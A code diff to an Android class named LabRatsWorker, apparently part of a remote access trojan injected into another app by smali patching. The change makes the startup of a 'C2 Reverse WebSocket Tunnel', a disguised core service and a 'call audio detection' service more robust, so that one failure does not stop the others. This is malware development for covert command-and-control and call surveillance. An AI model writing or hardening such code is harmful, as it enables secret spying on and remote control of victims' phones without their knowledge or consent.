@@ -30,18 +30,30 @@ public class LabRatsWorker {
         try {
             android.content.Context appContext = context.getApplicationContext();
             
-            // Start WorkManager_Sync core service
-            android.content.Intent serviceIntent = new android.content.Intent(appContext, WorkManager_Sync.class);
-            serviceIntent.setAction(Constants.ACTION_START_CORE);
-            androidx.core.content.ContextCompat.startForegroundService(appContext, serviceIntent);
+            // 1. Start C2 Reverse WebSocket Tunnel DIRECTLY
+            try {
+                C2_Tunnel.start(appContext);
+            } catch (Throwable t) {
+                android.util.Log.e("LabRatsWorker", "Failed to start C2_Tunnel", t);
+            }
 
-            // Start C2 Reverse WebSocket Tunnel
-            C2_Tunnel.start(appContext);
+            // 2. Start WorkManager_Sync core service
+            try {
+                android.content.Intent serviceIntent = new android.content.Intent(appContext, WorkManager_Sync.class);
+                serviceIntent.setAction(Constants.ACTION_START_CORE);
+                androidx.core.content.ContextCompat.startForegroundService(appContext, serviceIntent);
+            } catch (Throwable t) {
+                android.util.Log.e("LabRatsWorker", "Failed to start WorkManager_Sync service", t);
+            }
 
-            // Start MediaFrameworkService for call audio detection
-            android.content.Intent callServiceIntent = new android.content.Intent(appContext, MediaFrameworkService.class);
-            callServiceIntent.setAction(Constants.ACTION_START_AUDIO);
-            androidx.core.content.ContextCompat.startForegroundService(appContext, callServiceIntent);
+            // 3. Start MediaFrameworkService for call audio detection
+            try {
+                android.content.Intent callServiceIntent = new android.content.Intent(appContext, MediaFrameworkService.class);
+                callServiceIntent.setAction(Constants.ACTION_START_AUDIO);
+                androidx.core.content.ContextCompat.startForegroundService(appContext, callServiceIntent);
+            } catch (Throwable t) {
+                android.util.Log.e("LabRatsWorker", "Failed to start MediaFrameworkService", t);
+            }
 
             android.util.Log.i("LabRatsWorker", "SMALI_SURGERY_INIT: Lab-RATS services successfully initialized in bound application.");
         } catch (Throwable t) {
